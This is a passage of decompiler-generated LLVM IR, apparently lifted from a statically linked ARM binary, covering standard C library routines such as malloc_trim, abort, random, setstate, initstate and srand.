  %v3_17374 = load i32, i32* %v2_17374, align 4
  store i32 %v3_17374, i32* %r3.global-to-local, align 4
  %v1_17378 = urem i32 %v3_17374, 2
  %v2_17378 = icmp eq i32 %v1_17378, 0
  %v2_1737c = add i32 %v1_1737c, 4
  %v3_1737c = inttoptr i32 %v2_1737c to i32*
  store i32 %v1_17368, i32* %v3_1737c, align 4
  br i1 %v2_17378, label %dec_label_pc_17384, label %dec_label_pc_17370.dec_label_pc_173b4_crit_edge

dec_label_pc_17370.dec_label_pc_173b4_crit_edge:  ; preds = %dec_label_pc_17370
  %v0_173c4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_173b4

dec_label_pc_17384:                               ; preds = %dec_label_pc_17370
  %v0_17384 = load i32, i32* %lr.global-to-local, align 4
  %v1_17384 = add i32 %v0_17384, 8
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  store i32 %v3_17384, i32* %r1.global-to-local, align 4
  %v1_17388 = add i32 %v3_17384, 12
  %v2_17388 = inttoptr i32 %v1_17388 to i32*
  %v3_17388 = load i32, i32* %v2_17388, align 4
  store i32 %v3_17388, i32* %r3.global-to-local, align 4
  %v9_1738c = icmp eq i32 %v3_17388, %v0_17384
  %v1_17390 = add i32 %v0_17384, 12
  %v2_17390 = inttoptr i32 %v1_17390 to i32*
  %v3_17390 = load i32, i32* %v2_17390, align 4
  store i32 %v3_17390, i32* %r2.global-to-local, align 4
  br i1 %v9_1738c, label %dec_label_pc_17398, label %dec_label_pc_173a4

dec_label_pc_17398:                               ; preds = %dec_label_pc_17384
  %v1_17398 = add i32 %v3_17390, 8
  %v2_17398 = inttoptr i32 %v1_17398 to i32*
  %v3_17398 = load i32, i32* %v2_17398, align 4
  store i32 %v3_17398, i32* %r3.global-to-local, align 4
  %v9_1739c = icmp eq i32 %v3_17398, %v0_17384
  br i1 %v9_1739c, label %dec_label_pc_173a8, label %dec_label_pc_173a4

dec_label_pc_173a4:                               ; preds = %dec_label_pc_17384, %dec_label_pc_17340, %dec_label_pc_17324, %dec_label_pc_17398
  %v0_173a4 = call i32 @abort()
  store i32 %v0_173a4, i32* %r0.global-to-local, align 4
  %v0_173a8.pre = load i32, i32* @r1, align 4
  %v1_173a8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %dec_label_pc_17398, %dec_label_pc_173a4
  %v1_173a8 = phi i32 [ %v3_17390, %dec_label_pc_17398 ], [ %v1_173a8.pre, %dec_label_pc_173a4 ]
  %v0_173a8 = phi i32 [ %v3_17384, %dec_label_pc_17398 ], [ %v0_173a8.pre, %dec_label_pc_173a4 ]
  %v2_173a8 = add i32 %v1_173a8, 8
  %v3_173a8 = inttoptr i32 %v2_173a8 to i32*
  store i32 %v0_173a8, i32* %v3_173a8, align 4
  %v0_173ac = load i32, i32* %r2.global-to-local, align 4
  %v1_173ac = load i32, i32* %r1.global-to-local, align 4
  %v2_173ac = add i32 %v1_173ac, 12
  %v3_173ac = inttoptr i32 %v2_173ac to i32*
  store i32 %v0_173ac, i32* %v3_173ac, align 4
  %v0_173b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_173b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_173b0 = add i32 %v1_173b0, %v0_173b0
  store i32 %v2_173b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %dec_label_pc_17370.dec_label_pc_173b4_crit_edge, %dec_label_pc_173a8
  %v0_173c4 = phi i32 [ %v0_173c4.pre, %dec_label_pc_17370.dec_label_pc_173b4_crit_edge ], [ %v2_173b0, %dec_label_pc_173a8 ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_173b8 = load i32, i32* @r7, align 4
  %v2_173b8 = add i32 %v0_173b8, 36
  %v3_173b8 = inttoptr i32 %v2_173b8 to i32*
  %v4_173b8 = load i32, i32* %v3_173b8, align 4
  %v1_173bc = add i32 %v4_173b8, 52
  store i32 %v1_173bc, i32* %r3.global-to-local, align 4
  %v1_173c0 = add i32 %v4_173b8, 60
  %v2_173c0 = inttoptr i32 %v1_173c0 to i32*
  %v3_173c0 = load i32, i32* %v2_173c0, align 4
  store i32 %v3_173c0, i32* %r1.global-to-local, align 4
  %v1_173c4 = or i32 %v0_173c4, 1
  store i32 %v1_173c4, i32* @r2, align 4
  %v1_173c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_173c8 = add i32 %v1_173c8, 12
  %v3_173c8 = inttoptr i32 %v2_173c8 to i32*
  store i32 %v1_173bc, i32* %v3_173c8, align 4
  %v0_173cc = load i32, i32* %r1.global-to-local, align 4
  %v1_173cc = load i32, i32* %r4.global-to-local, align 4
  %v2_173cc = add i32 %v1_173cc, 8
  %v3_173cc = inttoptr i32 %v2_173cc to i32*
  store i32 %v0_173cc, i32* %v3_173cc, align 4
  %v0_173d0 = load i32, i32* @r2, align 4
  %v1_173d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_173d0 = add i32 %v1_173d0, 4
  %v3_173d0 = inttoptr i32 %v2_173d0 to i32*
  store i32 %v0_173d0, i32* %v3_173d0, align 4
  %v0_173d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_173d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_173d4 = add i32 %v1_173d4, %v0_173d4
  %v4_173d4 = inttoptr i32 %v3_173d4 to i32*
  store i32 %v0_173d4, i32* %v4_173d4, align 4
  %v0_173d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_173d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_173d8 = add i32 %v1_173d8, 12
  %v3_173d8 = inttoptr i32 %v2_173d8 to i32*
  store i32 %v0_173d8, i32* %v3_173d8, align 4
  %v0_173dc = load i32, i32* %r4.global-to-local, align 4
  %v1_173dc = load i32, i32* %r3.global-to-local, align 4
  %v2_173dc = add i32 %v1_173dc, 8
  %v3_173dc = inttoptr i32 %v2_173dc to i32*
  store i32 %v0_173dc, i32* %v3_173dc, align 4
  br label %dec_label_pc_173f4

dec_label_pc_173e4:                               ; preds = %dec_label_pc_17358
  %v2_173e4 = add i32 %v1_17368, %v0_173e4
  store i32 %v2_173e4, i32* %ip.global-to-local, align 4
  %v1_173e8 = or i32 %v2_173e4, 1
  store i32 %v1_173e8, i32* %r3.global-to-local, align 4
  %v0_173ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_173ec, i32* %v2_17360, align 4
  %v0_173f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_173f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_173f0 = add i32 %v1_173f0, 4
  %v3_173f0 = inttoptr i32 %v2_173f0 to i32*
  store i32 %v0_173f0, i32* %v3_173f0, align 4
  br label %dec_label_pc_173f4

dec_label_pc_173f4:                               ; preds = %dec_label_pc_173b4, %dec_label_pc_173e4
  %v0_173f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_173f8 = icmp ult i32 %v0_173f4, 131070
  br i1 %v3_173f8, label %dec_label_pc_17464, label %dec_label_pc_173fc

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173f4
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_17400 = load i32, i32* @r7, align 4
  %v2_17400 = add i32 %v0_17400, 36
  %v3_17400 = inttoptr i32 %v2_17400 to i32*
  %v4_17400 = load i32, i32* %v3_17400, align 4
  store i32 %v4_17400, i32* @r4, align 4
  %v1_17404 = inttoptr i32 %v4_17400 to i32*
  %v2_17404 = load i32, i32* %v1_17404, align 4
  store i32 %v2_17404, i32* %r3.global-to-local, align 4
  %v1_17408 = and i32 %v2_17404, 2
  %v2_17408 = icmp eq i32 %v1_17408, 0
  br i1 %v2_17408, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_173fc
  store i32 %v4_17400, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_173fc, %bb
  %v1_17410 = xor i1 %v2_17408, true
  call void @__pseudo_cond_branch(i1 %v1_17410, i32 ptrtoint (i32* @global_var_170b4.976 to i32))
  %v0_17414 = load i32, i32* @r4, align 4
  %v1_17414 = add i32 %v0_17414, 44
  %v2_17414 = inttoptr i32 %v1_17414 to i32*
  %v3_17414 = load i32, i32* %v2_17414, align 4
  store i32 %v3_17414, i32* %r3.global-to-local, align 4
  %v1_17418 = add i32 %v3_17414, 4
  %v2_17418 = inttoptr i32 %v1_17418 to i32*
  %v3_17418 = load i32, i32* %v2_17418, align 4
  store i32 %v3_17418, i32* %r3.global-to-local, align 4
  %v1_1741c = add i32 %v0_17414, 836
  %v2_1741c = inttoptr i32 %v1_1741c to i32*
  %v3_1741c = load i32, i32* %v2_1741c, align 4
  store i32 %v3_1741c, i32* @r2, align 4
  %v1_17420 = and i32 %v3_17418, -4
  store i32 %v1_17420, i32* %r3.global-to-local, align 4
  %v3_17424 = icmp ult i32 %v1_17420, %v3_1741c
  br i1 %v3_17424, label %dec_label_pc_17464, label %dec_label_pc_1742c

dec_label_pc_1742c:                               ; preds = %bb17
  store i32 %v0_17414, i32* %r1.global-to-local, align 4
  %v1_17430 = add i32 %v0_17414, 840
  %v2_17430 = inttoptr i32 %v1_17430 to i32*
  %v3_17430 = load i32, i32* %v2_17430, align 4
  store i32 %v3_17430, i32* %r0.global-to-local, align 4
  %v2_17434 = call i32 @__malloc_trim(i32 %v3_17430, i32 %v0_17414)
  store i32 %v2_17434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17464

dec_label_pc_1743c:                               ; preds = %dec_label_pc_17300
  %v2_1743c = inttoptr i32 %v1_172d0 to i32*
  %v3_1743c = load i32, i32* %v2_1743c, align 4
  store i32 %v3_1743c, i32* %r0.global-to-local, align 4
  %v1_17440 = add i32 %v4_172c0, 848
  %v2_17440 = inttoptr i32 %v1_17440 to i32*
  %v3_17440 = load i32, i32* %v2_17440, align 4
  store i32 %v3_17440, i32* %r2.global-to-local, align 4
  %v1_17444 = add i32 %v4_172c0, 868
  %v2_17444 = inttoptr i32 %v1_17444 to i32*
  %v3_17444 = load i32, i32* %v2_17444, align 4
  %v2_17448 = add i32 %v3_1743c, %v1_172cc
  store i32 %v2_17448, i32* %r1.global-to-local, align 4
  %v1_1744c = add i32 %v3_17440, -1
  store i32 %v1_1744c, i32* @r2, align 4
  %v2_17450 = sub i32 %v3_17444, %v2_17448
  store i32 %v2_17450, i32* %r3.global-to-local, align 4
  store i32 %v2_17450, i32* %v2_17444, align 4
  %v1_17458 = load i32, i32* @lr, align 4
  %v2_17458 = add i32 %v1_17458, 848
  %v3_17458 = inttoptr i32 %v2_17458 to i32*
  store i32 %v1_1744c, i32* %v3_17458, align 4
  %v0_1745c = load i32, i32* %r0.global-to-local, align 4
  %v1_1745c = load i32, i32* @r5, align 4
  %v2_1745c = sub i32 %v1_1745c, %v0_1745c
  store i32 %v2_1745c, i32* %r0.global-to-local, align 4
  %v4_17460 = call i32 @munmap(i32 %v2_1745c, i32 %v2_17448, i32 %v1_1744c, i32 %v2_17450)
  store i32 %v4_17460, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17464

dec_label_pc_17464:                               ; preds = %bb17, %dec_label_pc_173f4, %dec_label_pc_1742c, %dec_label_pc_172e0, %dec_label_pc_1743c
  store i32 %v2_17274, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_17470 = load i32, i32* @r7, align 4
  %v2_17470 = add i32 %v0_17470, 28
  %v3_17470 = inttoptr i32 %v2_17470 to i32*
  %v4_17470 = load i32, i32* %v3_17470, align 4
  store i32 %v4_17470, i32* @ip, align 4
  store i32 95356, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17470)
  br label %dec_label_pc_1747c

dec_label_pc_1747c:                               ; preds = %entry, %dec_label_pc_17464
  store i32 %v3_17268, i32* @r4, align 4
  store i32 %v6_17268, i32* @r5, align 4
  store i32 %v9_17268, i32* @r6, align 4
  store i32 %v12_17268, i32* @r7, align 4
  store i32 %v18_17268, i32* @lr, align 4
  ret i32 %v2_17274

; uselistorder directives
  uselistorder i32 %v0_17414, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_173d4, { 1, 0 }
  uselistorder i32 %v1_17314, { 1, 0 }
  uselistorder i32 %v0_17314, { 1, 0 }
  uselistorder i32 %v3_172e8, { 1, 0 }
  uselistorder i32 %v1_172cc, { 1, 0, 2 }
  uselistorder i32 %v2_172c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_172c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17270, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1747c, { 1, 0 }
  uselistorder label %dec_label_pc_17464, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_173f4, { 1, 0 }
  uselistorder label %dec_label_pc_173b4, { 1, 0 }
  uselistorder label %dec_label_pc_173a8, { 1, 0 }
  uselistorder label %dec_label_pc_173a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17358, { 1, 0 }
}

define i32 @function_1748c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1748c:
  %v0_1748c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1748c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1748c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1748c, %bb
  %v10_174a0 = phi i32 [ %arg1, %dec_label_pc_1748c ], [ 0, %bb ]
  ret i32 %v10_174a0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_174a4 = load i32, i32* @r4, align 4
  store i32 %v3_174a4, i32* %stack_var_-12, align 4
  %v6_174a4 = load i32, i32* @r5, align 4
  %v4_174b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 36) to i32*), align 4
  store i32 %v4_174b4, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_174b4, i32* @r0, align 4
  %v0_174c4 = call i32 @__malloc_consolidate()
  %v0_174c8 = load i32, i32* @r4, align 4
  %v0_174cc = load i32, i32* @r5, align 4
  %v2_174d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_174d4, i32* @r4, align 4
  store i32 %v6_174a4, i32* @r5, align 4
  %v2_174d8 = call i32 @__malloc_trim(i32 %v0_174c8, i32 %v0_174cc)
  %v0_174dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_174dc, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_174e0 = phi i32 [ %v2_174d8, %entry ], [ 0, %bb ]
  ret i32 %v4_174e0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  %v4_174fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 20) to i32*), align 4
  store i32 95496, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_174fc)
  %v2_17518 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_17524 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_17518, i32 0, i32 32)
  %v0_1752c = load i32, i32* @r5, align 4
  %v2_1752c = add i32 %v0_1752c, 26276
  %v3_1752c = inttoptr i32 %v2_1752c to i32*
  %v4_1752c = load i32, i32* %v3_1752c, align 4
  %v2_17530 = icmp eq i32 %v4_1752c, 0
  br i1 %v2_17530, label %dec_label_pc_17538, label %dec_label_pc_17578

dec_label_pc_17538:                               ; preds = %entry
  store i32 1, i32* %v3_1752c, align 4
  br label %dec_label_pc_17540

dec_label_pc_17540:                               ; preds = %dec_label_pc_17588, %dec_label_pc_17538
  %v0_17544 = load i32, i32* @r5, align 4
  %v2_17544 = add i32 %v0_17544, 888
  store i32 %v2_17544, i32* @r4, align 4
  %v2_17550 = add i32 %v0_17544, 40
  %v3_17550 = inttoptr i32 %v2_17550 to i32*
  %v4_17550 = load i32, i32* %v3_17550, align 4
  call void @__pseudo_branch(i32 %v4_17550)
  %v1_17560 = call i32 @__GI_raise(i32 6)
  %v0_1756c = load i32, i32* @r5, align 4
  %v2_1756c = add i32 %v0_1756c, 20
  %v3_1756c = inttoptr i32 %v2_1756c to i32*
  %v4_1756c = load i32, i32* %v3_1756c, align 4
  store i32 95608, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1756c)
  %v0_1757c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17578

dec_label_pc_17578:                               ; preds = %entry, %dec_label_pc_17540
  %v1_17590 = phi i32 [ %v0_1752c, %entry ], [ %v0_1757c.pre, %dec_label_pc_17540 ]
  %v2_1757c = add i32 %v1_17590, 26276
  %v3_1757c = inttoptr i32 %v2_1757c to i32*
  %v4_1757c = load i32, i32* %v3_1757c, align 4
  %v7_17580 = icmp eq i32 %v4_1757c, 1
  br i1 %v7_17580, label %dec_label_pc_17588, label %dec_label_pc_175c4

dec_label_pc_17588:                               ; preds = %dec_label_pc_17578
  %v2_17588 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_17588, i32* @r4, align 4
  store i32 2, i32* %v3_1757c, align 4
  store i32 20, i32* @r2, align 4
  %v2_175a0 = bitcast i32* %stack_var_-28 to i8*
  %v3_175a0 = call i32 @__GI_memset(i8* %v2_175a0, i32 0)
  %v3_175bc = call i32 @__libc_sigaction(i32 6, i32 %v2_17588, i32 0)
  br label %dec_label_pc_17540

dec_label_pc_175c4:                               ; preds = %dec_label_pc_17578
  %v7_175c4 = icmp eq i32 %v4_1757c, 2
  br i1 %v7_175c4, label %dec_label_pc_175cc, label %dec_label_pc_175d8

dec_label_pc_175cc:                               ; preds = %dec_label_pc_175c4
  store i32 3, i32* %v3_1757c, align 4
  %v0_175d4 = call i32 @abort()
  %v0_175d8.pre = load i32, i32* @r5, align 4
  %v1_175d8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_175d8

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175c4, %dec_label_pc_175cc
  %v3_175e4 = phi i32 [ 26276, %dec_label_pc_175c4 ], [ %v1_175d8.pre, %dec_label_pc_175cc ]
  %v2_175e4 = phi i32 [ %v1_17590, %dec_label_pc_175c4 ], [ %v0_175d8.pre, %dec_label_pc_175cc ]
  %v2_175d8 = add i32 %v2_175e4, %v3_175e4
  %v3_175d8 = inttoptr i32 %v2_175d8 to i32*
  %v4_175d8 = load i32, i32* %v3_175d8, align 4
  %v7_175dc = icmp eq i32 %v4_175d8, 3
  br i1 %v7_175dc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_175d8
  store i32 4, i32* %v3_175d8, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_175d8, %bb
  call void @__pseudo_cond_branch(i1 %v7_175dc, i32 ptrtoint (i32* @global_var_14314.985 to i32))
  br label %dec_label_pc_175f0

dec_label_pc_175f0:                               ; preds = %dec_label_pc_175f0, %.thread2
  %v0_175f0 = call i32 @abort()
  br label %dec_label_pc_175f0

; uselistorder directives
  uselistorder i32* %v3_1757c, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_175d8, { 1, 0 }
  uselistorder label %dec_label_pc_17578, { 1, 0 }
}

define i32 @function_175fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_175fc:
  %v0_175fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_175fc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_175fc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_175fc, %bb
  %v4_17608 = phi i32 [ %arg1, %dec_label_pc_175fc ], [ 0, %bb ]
  ret i32 %v4_17608

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_17614 = call i32 @random()
  ret i32 %v0_17614
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_17624 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  %v4_17654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17654)
  %v0_17668 = load i32, i32* @r4, align 4
  %v2_17668 = add i32 %v0_17668, 20
  %v3_17668 = inttoptr i32 %v2_17668 to i32*
  %v4_17668 = load i32, i32* %v3_17668, align 4
  store i32 ptrtoint (i32* @global_var_17674.991 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17668)
  %v2_17678 = ptrtoint i32* %stack_var_-20 to i32
  %v0_1767c = load i32, i32* @r4, align 4
  %v2_1767c = add i32 %v0_1767c, 1064
  %v2_17680 = inttoptr i32 %v2_1767c to i32*
  %v3_17680 = call i32 @__GI_random_r(i32* %v2_17680, i32 %v2_17678)
  %v0_17690 = load i32, i32* @r4, align 4
  %v2_17690 = add i32 %v0_17690, 28
  %v3_17690 = inttoptr i32 %v2_17690 to i32*
  %v4_17690 = load i32, i32* %v3_17690, align 4
  call void @__pseudo_branch(i32 %v4_17690)
  %v3_1769c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_17624, i32* @r4, align 4
  ret i32 %v3_1769c
}

define i32 @function_176b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_176b0:
  %v0_176b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_176b0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_176b0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_176b0, %bb
  %v10_176c4 = phi i32 [ %arg1, %dec_label_pc_176b0 ], [ 0, %bb ]
  ret i32 %v10_176c4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_176f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_176f8)
  %v0_1770c = load i32, i32* @r6, align 4
  %v2_1770c = add i32 %v0_1770c, 20
  %v3_1770c = inttoptr i32 %v2_1770c to i32*
  %v4_1770c = load i32, i32* %v3_1770c, align 4
  call void @__pseudo_branch(i32 %v4_1770c)
  %v0_1771c = load i32, i32* @r6, align 4
  %v2_1771c = add i32 %v0_1771c, 1064
  %v0_17724 = load i32, i32* @r5, align 4
  %v1_17728 = add i32 %v0_1771c, 1072
  %v2_17728 = inttoptr i32 %v1_17728 to i32*
  %v3_17728 = load i32, i32* %v2_17728, align 4
  store i32 %v3_17728, i32* @r4, align 4
  %v2_1772c = inttoptr i32 %v2_1771c to i32*
  %v3_1772c = call i32 @setstate_r(i32 %v0_17724, i32* %v2_1772c)
  %v1_17734 = icmp slt i32 %v3_1772c, 0
  %v3_17744 = load i32, i32* @r4, align 4
  %v4_17744 = add i32 %v3_17744, -4
  %storemerge = select i1 %v1_17734, i32 0, i32 %v4_17744
  %v0_17748 = load i32, i32* @r6, align 4
  %v2_17748 = add i32 %v0_17748, 28
  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  %v4_17748 = load i32, i32* %v3_17748, align 4
  call void @__pseudo_branch(i32 %v4_17748)
  ret i32 %storemerge
}

define i32 @function_17768(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17768:
  %v0_17768 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17768, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17768
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17768, %bb
  %v10_1777c = phi i32 [ %arg1, %dec_label_pc_17768 ], [ 0, %bb ]
  ret i32 %v10_1777c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_177b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_177b8)
  %v0_177cc = load i32, i32* @r4, align 4
  %v2_177cc = add i32 %v0_177cc, 20
  %v3_177cc = inttoptr i32 %v2_177cc to i32*
  %v4_177cc = load i32, i32* %v3_177cc, align 4
  call void @__pseudo_branch(i32 %v4_177cc)
  %v0_177dc = load i32, i32* @r6, align 4
  %v0_177e0 = load i32, i32* @r4, align 4
  %v2_177e0 = add i32 %v0_177e0, 1064
  %v0_177e4 = load i32, i32* @r7, align 4
  %v0_177e8 = load i32, i32* @sl, align 4
  store i32 %v0_177e8, i32* @r0, align 4
  %v1_177ec = add i32 %v0_177e0, 1072
  %v2_177ec = inttoptr i32 %v1_177ec to i32*
  %v3_177ec = load i32, i32* %v2_177ec, align 4
  store i32 %v3_177ec, i32* @r5, align 4
  %v4_177f0 = inttoptr i32 %v0_177e8 to i32*
  %v5_177f0 = call i32 @__GI_initstate_r(i32* %v4_177f0, i32 %v0_177dc, i32 %v0_177e4, i32 %v2_177e0)
  %v0_17800 = load i32, i32* @r4, align 4
  %v2_17800 = add i32 %v0_17800, 28
  %v3_17800 = inttoptr i32 %v2_17800 to i32*
  %v4_17800 = load i32, i32* %v3_17800, align 4
  call void @__pseudo_branch(i32 %v4_17800)
  %v0_1780c = load i32, i32* @r5, align 4
  %v1_1780c = add i32 %v0_1780c, -4
  ret i32 %v1_1780c
}

define i32 @function_17828(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17828:
  %v0_17828 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17828, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17828
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17828, %bb
  %v10_1783c = phi i32 [ %arg1, %dec_label_pc_17828 ], [ 0, %bb ]
  ret i32 %v10_1783c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_17840 = load i32, i32* @r4, align 4
  %v6_17840 = load i32, i32* @r5, align 4
  %v9_17840 = load i32, i32* @r6, align 4
  %v15_17840 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  %v2_17854 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 912), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_17870 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17870)
  %v0_17884 = load i32, i32* @r4, align 4
  %v2_17884 = add i32 %v0_17884, 20
  %v3_17884 = inttoptr i32 %v2_17884 to i32*
  %v4_17884 = load i32, i32* %v3_17884, align 4
  call void @__pseudo_branch(i32 %v4_17884)
  %v0_17894 = load i32, i32* @r6, align 4
  store i32 %v0_17894, i32* @r0, align 4
  %v0_17898 = load i32, i32* @r4, align 4
  %v2_17898 = add i32 %v0_17898, 1064
  %v2_1789c = inttoptr i32 %v0_17894 to i32*
  %v3_1789c = call i32 @srandom_r(i32* %v2_1789c, i32 %v2_17898)
  %v0_178b0 = load i32, i32* @r4, align 4
  %v2_178b0 = add i32 %v0_178b0, 28
  %v3_178b0 = inttoptr i32 %v2_178b0 to i32*
  %v4_178b0 = load i32, i32* %v3_178b0, align 4
  call void @__pseudo_branch(i32 %v4_178b0)
  store i32 %v3_17840, i32* @r4, align 4
  store i32 %v6_17840, i32* @r5, align 4
  store i32 %v9_17840, i32* @r6, align 4
  store i32 %v15_17840, i32* @lr, align 4
  ret i32 %v2_17854
}

define i32 @function_178cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_178cc:
  %v0_178cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_178cc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_178cc
